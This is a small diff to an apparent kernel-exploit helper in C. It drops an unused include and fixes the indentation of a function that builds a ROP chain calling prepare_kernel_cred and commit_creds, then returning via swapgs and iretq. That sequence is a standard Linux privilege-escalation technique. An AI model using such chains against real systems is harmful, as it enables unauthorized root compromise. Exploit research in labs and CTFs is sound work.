@@ -1,4 +1,3 @@
-#include <iterator>
 #include <stddef.h>
 #include <stdint.h>
 #include "rop.h"
@@ -23,13 +22,13 @@ size_t append_chain(uintptr_t *dst,
 
 /* ROP: prepare_kernel_cred -> commit_creds -> swapgs -> iretq */
 size_t chain_kcred_iretq(uintptr_t *rop,
-                       	uintptr_t pop_rdi_ret,
-                       	uintptr_t prepare_kernel_cred,
-                       	const uintptr_t *mov_rax_to_rdi_chain,
-                       	uintptr_t commit_creds,
-                       	uintptr_t swapgs_pop_rbp_ret,
-                       	uintptr_t iretq,
-                       	iretq_user_ctx_t ctx)
+                        uintptr_t pop_rdi_ret,
+                        uintptr_t prepare_kernel_cred,
+                        const uintptr_t *mov_rax_to_rdi_chain,
+                        uintptr_t commit_creds,
+                        uintptr_t swapgs_pop_rbp_ret,
+                        uintptr_t iretq,
+                        iretq_user_ctx_t ctx)
 {
     size_t i = 0;
 
